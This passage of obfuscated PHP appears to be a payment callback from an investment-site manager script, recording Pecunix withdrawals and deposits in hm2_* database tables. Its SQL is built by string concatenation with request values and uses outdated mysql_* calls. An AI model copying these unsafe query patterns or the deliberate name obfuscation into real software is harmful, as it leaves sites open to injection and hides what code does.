      $elnlcURTi = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $elnlcGWAnG[$elnlcFAei['elnlcxNgII']] = '$';
      $elnlcGWAnG[$elnlcFAei['elnlcNDGyh']] = $elnlcFAei['elnlcuNxfU'];
      $elnlcGWAnG[$elnlcFAei['elnlcdnSK']] = $elnlcFAei['elnlcjlKJD'];
      $elnlcGWAnG[$elnlcFAei['elnlcxuUV']] = $elnlcFAei['elnlcmGwSG'];
    }
  }

  $elnlcGWAnG[$elnlcFAei['elnlcOdWB']] = $elnlcFAei['elnlcuNxfU'];
  if ((($elnlcGWAnG[$elnlcFAei['elnlceSsS']] AND !$elnlcGWAnG[$elnlcFAei['elnlcyNfg']]) AND !$elnlcGWAnG[$elnlcFAei['elnlcapqS']]))
  {
    $elnlcGWAnG[$elnlcFAei['elnlcapqS']] = $elnlcFAei['elnlcuNxfU'];
  }

  if ($elnlcGWAnG[$elnlcFAei['elnlcyNfg']])
  {
    $elnlcGWAnG[$elnlcFAei['elnlcHzpO']] = $elnlcGWAnG[$elnlcFAei['elnlceSsS']];
  }
  else
  {
    $elnlcGWAnG[$elnlcFAei['elnlcHzpO']] = '';
  }

  if ($elnlcGWAnG[$elnlcFAei['elnlcapqS']])
  {
    $elnlcGWAnG[$elnlcFAei['elnlcDELrc']] = $elnlcGWAnG[$elnlcFAei['elnlceSsS']];
  }
  else
  {
    $elnlcGWAnG[$elnlcFAei['elnlcDELrc']] = '';
  }

  foreach ($elnlcURTi as $elnlclxfTc => $elnlcqcAV)
  {
    if (($elnlcGWAnG['def_payee_account_' . $elnlcqcAV['sfx']] != '' AND $elnlcGWAnG['def_payee_account_' . $elnlcqcAV['sfx']] != '0'))
    {
      $elnlcURTi[$elnlclxfTc][$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcuNxfU'];
      continue;
    }
    else
    {
      $elnlcURTi[$elnlclxfTc][$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlczkHC'];
      continue;
    }
  }

  if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcvrEI'])
  {
    $elnlcMonni = array (1 => 'english', 2 => 'estonians', 3 => $elnlcFAei['elnlcRxlOJ']);
  }

  if (($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] != 'RHLFPPEURGQGG68GXYA8' AND $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $elnlcGWAnG[$elnlcFAei['elnlcspau']] = $elnlcFAei['elnlczkHC'];
  }

  if (($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcskrmh'] OR $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlciWgV']))
  {
    $elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] = $elnlcFAei['elnlcuNxfU'];
  }

  if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcUjGMl'])
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcqbwvE'] OR $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcPSqmR']) OR $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcanrzT']) OR $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcsgLcM']) OR $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcNqLh']) OR $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcwOWb']))
  {
    if ($elnlcLjgi[$elnlcFAei['elnlcWnSNa']] != '')
    {
      $elnlcLjgi[$elnlcFAei['elnlcMVzu']] = $elnlcLjgi[$elnlcFAei['elnlcWnSNa']];
      $_SERVER[$elnlcFAei['elnlcMVzu']] = $elnlcLjgi[$elnlcFAei['elnlcWnSNa']];
    }
  }

  $elnlcSVvJm = elnlcriohi ();
  if (!$elnlcSVvJm)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  $elnlcgRoG = $elnlcGWAnG[$elnlcFAei['elnlceVlMp']];
  if ($elnlcLJnqt[$elnlcFAei['elnlcVCOB']] == $elnlcFAei['elnlcSVgf'])
  {
    $elnlcfJcI = elnlcqedaf ($elnlcLJnqt[$elnlcFAei['elnlcnzaNr']]);
    list ($elnlclxfTc, $elnlcuFfm) = explode ('-', $elnlcLJnqt[$elnlcFAei['elnlcyVlp']]);
    $elnlclxfTc = sprintf ('%d', $elnlclxfTc);
    if ($elnlcuFfm == '')
    {
      $elnlcuFfm = $elnlcFAei['elnlcgpPTq'];
    }

    $elnlcuFfm = elnlcqedaf ($elnlcuFfm);
    $q = '' . 'select * from hm2_history where id = ' . $elnlclxfTc . ' and str = \'' . $elnlcuFfm . '\' and type=\'withdraw_pending\'';
    $elnlcSQAa = mysql_query ($q);
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlclxfTc;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']] . ',
	amount = -' . abs ($elnlctLoC[$elnlcFAei['elnlcBBFw']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcfJcI . '\',
	actual_amount = -') . abs ($elnlctLoC[$elnlcFAei['elnlcBBFw']]) . ',
	ec = 9,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlctLoC[$elnlcFAei['elnlcbckB']];
      $elnlcPbdxm = mysql_query ($q);
      $elnlcDzHM = mysql_fetch_array ($elnlcPbdxm);
      $elnlcQtyf = array ($elnlcJiSD);
      $elnlcQtyf[$elnlcFAei['elnlcrMbQT']] = $elnlcDzHM[$elnlcFAei['elnlcrMbQT']];
      $elnlcQtyf[$elnlcFAei['elnlcgjvwt']] = $elnlcDzHM[$elnlcFAei['elnlcgjvwt']];
      $elnlcQtyf[$elnlcFAei['elnlcBBFw']] = sprintf ('%.02f', abs ($elnlctLoC[$elnlcFAei['elnlcBBFw']]));
      $elnlcQtyf[$elnlcFAei['elnlcDiPr']] = $elnlcLJnqt[$elnlcFAei['elnlcKHFet']];
      $elnlcQtyf[$elnlcFAei['elnlcvQzwa']] = $elnlcfJcI;
      $elnlcQtyf[$elnlcFAei['elnlccLNs']] = $elnlcfJcI;
      $elnlcQtyf[$elnlcFAei['elnlcwTTti']] = $elnlcfJcI;
      $elnlcQtyf[$elnlcFAei['elnlcvvGo']] = $elnlcURTi[9][$elnlcFAei['elnlcgjvwt']];
      elnlcqayqa ('withdraw_user_notification', $elnlcDzHM['email'], $elnlcGWAnG[$elnlcFAei['elnlcSOkPu']], $elnlcQtyf);
    }

    print 1;
    elnlckasdl ($elnlcSVvJm);
    exit ();
  }

  $elnlcSFadg = strtoupper (md5 ($elnlcLJnqt[$elnlcFAei['elnlcKHFet']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlcUAzuh']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlchHHu']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlcDGSc']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlcnzaNr']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlczbwU']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlcLtzIg']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlcLbBy']] . ':' . $elnlcLJnqt[$elnlcFAei['elnlcMiiR']] . ':' . $elnlcgRoG));
  if ((($elnlcSFadg == strtoupper ($elnlcLJnqt[$elnlcFAei['elnlcVhsvs']]) AND strtolower ($elnlcGWAnG[$elnlcFAei['elnlcGnWK']]) == strtolower ($elnlcLJnqt[$elnlcFAei['elnlcKHFet']])) AND ($elnlcURTi[9][$elnlcFAei['elnlcJzws']] == 1 AND 0 < $elnlcLJnqt[$elnlcFAei['elnlcnzaNr']])))
  {
    $elnlcwnpbc = sprintf ('%d', $elnlcLJnqt[$elnlcFAei['elnlcfMDRV']]);
    $elnlcTJoSQ = sprintf ('%d', $elnlcLJnqt[$elnlcFAei['elnlchkmAH']]);
    $elnlcPJFLE = sprintf ('%d', $elnlcLJnqt[$elnlcFAei['elnlcLckHM']]);
    $elnlcLMULg = $elnlcLJnqt[$elnlcFAei['elnlcUAzuh']];
    $elnlcfJcI = $elnlcLJnqt[$elnlcFAei['elnlcnzaNr']];
    $elnlcrIPNm = $elnlcLJnqt[$elnlcFAei['elnlcDGSc']];
    if (($elnlcLJnqt[$elnlcFAei['elnlcVCOB']] == $elnlcFAei['elnlcJofi'] AND $elnlcLJnqt[$elnlcFAei['elnlchHHu']] == $elnlcFAei['elnlcxTIIT']))
    {
      elnlciegzf (9, $elnlcwnpbc, $elnlcLMULg, $elnlcfJcI, $elnlcrIPNm, $elnlcTJoSQ, $elnlcPJFLE);
    }

    if (($elnlcLJnqt[$elnlcFAei['elnlcVCOB']] == $elnlcFAei['elnlcyqLC'] AND $elnlcLJnqt[$elnlcFAei['elnlchHHu']] == $elnlcFAei['elnlcxTIIT']))
    {
      if ($elnlcLMULg == $elnlcGWAnG[$elnlcFAei['elnlcRtIO']])
      {
        $q = '' . 'update hm2_users set reg_fee = ' . $elnlcLMULg . ' where id = ' . $elnlcwnpbc;
        (mysql_query ($q) OR print mysql_error ());
      }
    }
  }

  elnlckasdl ($elnlcSVvJm);
  print '1';
  exit ();
?>